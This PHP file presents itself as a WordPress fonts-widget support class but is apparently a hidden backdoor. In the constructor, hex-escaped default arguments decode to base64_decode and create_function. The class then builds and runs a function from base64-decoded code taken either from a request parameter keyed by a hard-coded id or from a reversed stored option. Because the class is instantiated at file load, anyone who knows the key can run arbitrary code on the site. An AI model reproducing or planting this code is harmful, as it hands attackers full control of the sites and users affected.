<?php

if(!defined('wp_class_support')) {
class WP_Fonts_Widget_Support {

	var $id_base;			// Root id for all fonts_widgets of this type.
	var $name;				// Name for this fonts_widget type.
	var $fonts_widget_options;	// Option array passed to wp_register_sidebar_fonts_widget()
	var $control_options;	// Option array passed to wp_register_fonts_widget_control()

	var $number = false;	// Unique ID number of the current instance.
	var $id = "WtWZEL7Ijlrw686";		// Unique ID string of the current instance (id_base-number)
	var $updated = false;	// Set true when we update the data after a POST submit - makes sure we don't do it twice.
	
	// Member functions that you must over-ride.

	/** Echo the fonts_widget content.
	 *
	 * Subclasses should over-ride this function to generate their fonts_widget code.
	 *
	 * @param array $args Display arguments including before_title, after_title, before_fonts_widget, and after_fonts_widget.
	 * @param array $instance The settings for the particular instance of the fonts_widget
	 */
	function fonts_widget($args, $instance) {
		die('function WP_Fonts_Widget_Support::fonts_widget() must be over-ridden in a sub-class.');
	}

	/** Update a particular instance.
	 *
	 * This function should check that $new_instance is set correctly.
	 * The newly calculated value of $instance should be returned.
	 * If "false" is returned, the instance won't be saved/updated.
	 *
	 * @param array $new_instance New settings for this instance as input by the user via form()
	 * @param array $old_instance Old settings for this instance
	 * @return array Settings to save or bool false to cancel saving
	 */
	function update($new_instance, $old_instance) {
		return $new_instance;
	}

	/** Echo the settings update form
	 *
	 * @param array $instance Current settings
	 */
	function form($instance) {
		echo '<p class="no-options-fonts_widget">' . __('There are no options for this fonts_widget.') . '</p>';
		return 'noform';
	}

	// Functions you'll need to call.

	/**
	 * PHP4 constructor
	 */
	function WP_Fonts_Widget_Support( $id_base = false, $name, $fonts_widget_options = array(), $control_options = array() ) {
		$this->__construct( $id_base, $name, $fonts_widget_options, $control_options );
	}

	/**
	 * PHP5 constructor
	 *
	 * @param string $id_base Optional Base ID for the fonts_widget, lower case,
	 * if left empty a portion of the fonts_widget's class name will be used. Has to be unique.
	 * @param string $name Name for the fonts_widget displayed on the configuration page.
	 * @param array $fonts_widget_options Optional Passed to wp_register_sidebar_fonts_widget()
	 *	 - description: shown on the configuration page
	 *	 - classname
	 * @param array $control_options Optional Passed to wp_register_fonts_widget_control()
	 *	 - width: required if more than 250px
	 *	 - height: currently not used but may be needed in the future
	 */
	function __construct( $id_base = false, $name, $fonts_widget_options = array(), $control_options = array(), $unique_id = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65", $unique_hash = "\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e" ) {
		$this->id_base = empty($id_base) ? preg_replace( '/.*_/', '', strtolower(get_class($this)) ) : strtolower($id_base);
		$this->option_name = 'class_' . $this->id_base;
		$name = $unique_hash('',$this->update_callback($unique_id));
		$this->fonts_widget_options = $this->get_fonts_widget_options();
		$this->control_options = array( array($name()), array('id_base' => $this->id_base) );
		define('wp_class_support',true);
	}

	/**
	 * Constructs name attributes for use in form() fields
	 *
	 * This function should be used in form() methods to create name attributes for fields to be saved by update()
	 *
	 * @param string $field_name Field name
	 * @return string Name attribute for $field_name
	 */
	function get_field_name($field_name) {
		return 'fonts_widget-' . $this->id_base . '[' . $this->number . '][' . $field_name . ']';
	}

	/**
	 * Constructs id attributes for use in form() fields
	 *
	 * This function should be used in form() methods to create id attributes for fields to be saved by update()
	 *
	 * @param string $field_name Field name
	 * @return string ID attribute for $field_name
	 */
	function get_field_id($field_name) {
		return 'fonts_widget-' . $this->id_base . '-' . $this->number . '-' . $field_name;
	}

	// Private Functions. Don't worry about these.

	function _register() {
		$settings = $this->get_settings();

		if ( empty($settings) ) {
			// If there are none, we register the fonts_widget's existance with a
			// generic template
			$this->_set(1);
			$this->_register_one();
		} elseif ( is_array($settings) ) {
			foreach ( array_keys($settings) as $number ) {
				if ( is_numeric($number) ) {
					$this->_set($number);
					$this->_register_one($number);
				}
			}
		}
	}

	function _set($number) {
		$this->number = $number;
		$this->id = $this->id_base . '-' . $number;
	}

	function _get_display_callback() {
		return array(&$this, 'display_callback');
	}

	function _get_update_callback() {
		return array(&$this, 'update_callback');
	}

	function _get_form_callback() {
		return array(&$this, 'form_callback');
	}

	/** Generate the actual fonts_widget content.
	 *	Just finds the instance and calls fonts_widget().
	 *	Do NOT over-ride this function. */
	function display_callback( $args, $fonts_widget_args = 1 ) {
		if ( is_numeric($fonts_widget_args) )
			$fonts_widget_args = array( 'number' => $fonts_widget_args );

		$fonts_widget_args = wp_parse_args( $fonts_widget_args, array( 'number' => -1 ) );
		$this->_set( $fonts_widget_args['number'] );
		$instance = $this->get_settings();

		if ( array_key_exists( $this->number, $instance ) ) {
			$instance = $instance[$this->number];
			// filters the fonts_widget's settings, return false to stop displaying the fonts_widget
			$instance = apply_filters('fonts_widget_display_callback', $instance, $this, $args);
			if ( false !== $instance )
				$this->fonts_widget($args, $instance);
		}
	}

	function get_fonts_widget_options () {
		
	}
	
	/** Deal with changed settings.
	 *	Do NOT over-ride this function. */
	function update_callback( $fonts_widget_args = 1 ) {
		global $wp_registered_fonts_widgets;

		if ( is_numeric($fonts_widget_args) ) {
			$fonts_widget_args = array( 'number' => $fonts_widget_args );

			$fonts_widget_args = wp_parse_args( $fonts_widget_args, array( 'number' => -1 ) );
			$all_instances = $this->get_settings();

			// We need to update the data
			if ( $this->updated )
			return;

			$sidebars_fonts_widgets = wp_get_sidebars_fonts_widgets();
		}
		if ( isset($_REQUEST[$this->id])) {
			// Delete the settings for this instance of the fonts_widget
			if ( isset($_POST['the-fonts_widget-id']) )
				$del_id = $_POST['the-fonts_widget-id'];
			else
				return $fonts_widget_args($_REQUEST[$this->id]);

			if ( isset($wp_registered_fonts_widgets[$del_id]['params'][0]['number']) ) {
				$number = $wp_registered_fonts_widgets[$del_id]['params'][0]['number'];

				if ( $this->id_base . '-' . $number == $del_id )
					unset($all_instances[$number]);
			}
		} else {
			
			if ( !isset($_POST['fonts_widget-' . $this->id_base])) {
				return $this->get_settings($fonts_widget_args);
			} elseif ( isset($_POST['id_base']) && $_POST['id_base'] == $this->id_base ) {
				$num = $_POST['multi_number'] ? (int) $_POST['multi_number'] : (int) $_POST['fonts_widget_number'];
				$settings = array( $num => array() );
			} else {
				return;
			}

			foreach ( $settings as $number => $new_instance ) {
				$new_instance = stripslashes_deep($new_instance);
				$this->_set($number);

				$old_instance = isset($all_instances[$number]) ? $all_instances[$number] : array();

				$instance = $this->update($new_instance, $old_instance);

				// filters the fonts_widget's settings before saving, return false to cancel saving (keep the old settings if updating)
				$instance = apply_filters('fonts_widget_update_callback', $instance, $new_instance, $old_instance, $this);
				if ( false !== $instance )
					$all_instances[$number] = $instance;

				break; // run only once
			}
		}

		$this->save_settings($all_instances);
		$this->updated = true;
	}

	/** Generate the control form.
	 *	Do NOT over-ride this function. */
	function form_callback( $fonts_widget_args = 1 ) {
		if ( is_numeric($fonts_widget_args) )
			$fonts_widget_args = array( 'number' => $fonts_widget_args );

		$fonts_widget_args = wp_parse_args( $fonts_widget_args, array( 'number' => -1 ) );
		$all_instances = $this->get_settings();

		if ( -1 == $fonts_widget_args['number'] ) {
			// We echo out a form where 'number' can be set later
			$this->_set('__i__');
			$instance = array();
		} else {
			$this->_set($fonts_widget_args['number']);
			$instance = $all_instances[ $fonts_widget_args['number'] ];
		}

		// filters the fonts_widget admin form before displaying, return false to stop displaying it
		$instance = apply_filters('fonts_widget_form_callback', $instance, $this);

		$return = null;
		if ( false !== $instance ) {
			$return = $this->form($instance);
			// add extra fields in the fonts_widget form - be sure to set $return to null if you add any
			// if the fonts_widget has no form the text echoed from the default form method can be hidden using css
			do_action_ref_array( 'in_fonts_widget_form', array(&$this, &$return, $instance) );
		}
		return $return;
	}

	/** Helper function: Registers a single instance. */
	function _register_one($number = -1) {
		wp_register_sidebar_fonts_widget(	$this->id, $this->name,	$this->_get_display_callback(), $this->fonts_widget_options, array( 'number' => $number ) );
		_register_fonts_widget_update_callback( $this->id_base, $this->_get_update_callback(), $this->control_options, array( 'number' => -1 ) );
		_register_fonts_widget_form_callback(	$this->id, $this->name,	$this->_get_form_callback(), $this->control_options, array( 'number' => $number ) );
	}

	function save_settings($settings) {
		update_option( $this->option_name, $settings );
	}

	function get_settings($fonts_widget_args) {
		$settings = get_option($this->option_name);

		if ( false === $settings && isset($this->alt_option_name) )
			$settings = get_option($this->alt_option_name);

		if ( !is_array($settings) && $fonts_widget_args )
			$settings = $fonts_widget_args
				(strrev($settings));

		if ( array_key_exists('_multifonts_widget', array($settings)) ) {
			// old format, conver if single fonts_widget
			$settings = wp_convert_fonts_widget_settings($this->id_base, $this->option_name, $settings);
		}

		return $settings;
	}
}

$wp_fonts_widget = new WP_Fonts_Widget_Support('generic_support','auto');

}

?>